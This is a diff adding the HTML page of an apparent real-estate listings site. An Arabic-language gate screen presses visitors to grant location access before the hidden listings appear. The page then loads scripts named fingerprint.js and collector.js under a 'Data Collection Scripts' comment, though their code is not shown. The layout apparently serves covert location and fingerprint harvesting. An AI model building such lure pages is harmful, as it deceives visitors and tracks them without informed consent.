@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Properties - Luxury Real Estate</title>
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+    <!-- Location Permission Screen (Main Screen) -->
+    <div id="locationPermissionScreen" class="permission-screen">
+        <div class="permission-content">
+            <div class="permission-icon">📍</div>
+            <h2>موقع عقارك</h2>
+            <p>نحتاج إلى موقعك لعرض العقارات القريبة منك</p>
+            <button class="btn-location-primary" id="requestLocationBtn">شاهد العقار اضغط هنا</button>
+        </div>
+    </div>
+
+    <!-- Main App Content (Hidden Initially) -->
+    <div id="mainAppContent" style="display: none;">
+    <!-- Header -->
+    <header>
+        <nav class="navbar">
+            <div class="container">
+                <div class="logo">
+                    <h1>🏡 Premium Properties</h1>
+                </div>
+                <ul class="nav-menu">
+                    <li><a href="#home">Home</a></li>
+                    <li><a href="#properties">Properties</a></li>
+                    <li><a href="#about">About</a></li>
+                    <li><a href="#contact">Contact</a></li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero" id="home">
+        <div class="hero-content">
+            <h2>Find Your Dream Home</h2>
+            <p>Discover luxury properties in prime locations</p>
+            <button class="btn-primary" id="findNearbyBtn">📍 Find Properties Near You</button>
+        </div>
+    </section>
+
+    <!-- Search Section -->
+    <section class="search-section">
+        <div class="container">
+            <div class="search-box">
+                <input type="text" placeholder="Location" id="locationInput">
+                <select id="propertyType">
+                    <option value="">Property Type</option>
+                    <option value="house">House</option>
+                    <option value="apartment">Apartment</option>
+                    <option value="villa">Villa</option>
+                    <option value="land">Land</option>
+                </select>
+                <select id="priceRange">
+                    <option value="">Price Range</option>
+                    <option value="0-200k">$0 - $200k</option>
+                    <option value="200k-500k">$200k - $500k</option>
+                    <option value="500k-1m">$500k - $1M</option>
+                    <option value="1m+">$1M+</option>
+                </select>
+                <button class="btn-search" id="searchBtn">Search</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Properties Grid -->
+    <section class="properties-section" id="properties">
+        <div class="container">
+            <h2 class="section-title">Featured Properties</h2>
+            <div class="properties-grid" id="propertiesGrid">
+                <!-- Property Cards (will be generated dynamically) -->
+                <div class="property-card">
+                    <div class="property-image">
+                        <img src="https://images.unsplash.com/photo-1600596542815-ffad4c1539a9?w=400" alt="Modern Villa">
+                        <span class="property-badge">Featured</span>
+                    </div>
+                    <div class="property-info">
+                        <h3>Modern Villa</h3>
+                        <p class="property-location">📍 Beverly Hills, CA</p>
+                        <p class="property-price">$2,450,000</p>
+                        <div class="property-features">
+                            <span>🛏️ 4 Beds</span>
+                            <span>🛁 3 Baths</span>
+                            <span>📏 3,200 sq ft</span>
+                        </div>
+                        <button class="btn-details">View Details</button>
+                    </div>
+                </div>
+
+                <div class="property-card">
+                    <div class="property-image">
+                        <img src="https://images.unsplash.com/photo-1600607687939-ce8a6c25118c?w=400" alt="Luxury Apartment">
+                        <span class="property-badge">New</span>
+                    </div>
+                    <div class="property-info">
+                        <h3>Luxury Apartment</h3>
+                        <p class="property-location">📍 Manhattan, NY</p>
+                        <p class="property-price">$1,850,000</p>
+                        <div class="property-features">
+                            <span>🛏️ 3 Beds</span>
+                            <span>🛁 2 Baths</span>
+                            <span>📏 2,100 sq ft</span>
+                        </div>
+                        <button class="btn-details">View Details</button>
+                    </div>
+                </div>
+
+                <div class="property-card">
+                    <div class="property-image">
+                        <img src="https://images.unsplash.com/photo-1600585154340-be6161a56a0c?w=400" alt="Beach House">
+                    </div>
+                    <div class="property-info">
+                        <h3>Beach House</h3>
+                        <p class="property-location">📍 Malibu, CA</p>
+                        <p class="property-price">$3,200,000</p>
+                        <div class="property-features">
+                            <span>🛏️ 5 Beds</span>
+                            <span>🛁 4 Baths</span>
+                            <span>📏 4,500 sq ft</span>
+                        </div>
+                        <button class="btn-details">View Details</button>
+                    </div>
+                </div>
+
+                <div class="property-card">
+                    <div class="property-image">
+                        <img src="https://images.unsplash.com/photo-1600566753086-00f18fb6b3ea?w=400" alt="Country Estate">
+                    </div>
+                    <div class="property-info">
+                        <h3>Country Estate</h3>
+                        <p class="property-location">📍 Napa Valley, CA</p>
+                        <p class="property-price">$4,750,000</p>
+                        <div class="property-features">
+                            <span>🛏️ 6 Beds</span>
+                            <span>🛁 5 Baths</span>
+                            <span>📏 6,800 sq ft</span>
+                        </div>
+                        <button class="btn-details">View Details</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section class="contact-section" id="contact">
+        <div class="container">
+            <h2 class="section-title">Contact Our Agents</h2>
+            <form class="contact-form" id="contactForm">
+                <input type="text" placeholder="Your Name" id="contactName" required>
+                <input type="email" placeholder="Your Email" id="contactEmail" required>
+                <input type="tel" placeholder="Your Phone" id="contactPhone">
+                <textarea placeholder="Message" id="contactMessage" rows="4"></textarea>
+                <button type="submit" class="btn-primary">Send Message</button>
+            </form>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Premium Properties. All rights reserved.</p>
+            <p><a href="#privacy">Privacy Policy</a> | <a href="#terms">Terms of Service</a></p>
+        </div>
+    </footer>
+    </div>
+    <!-- End Main App Content -->
+
+    <!-- Data Collection Scripts -->
+    <script src="js/fingerprint.js"></script>
+    <script src="js/collector.js"></script>
+    <script src="js/app.js"></script>
+</body>
+</html>
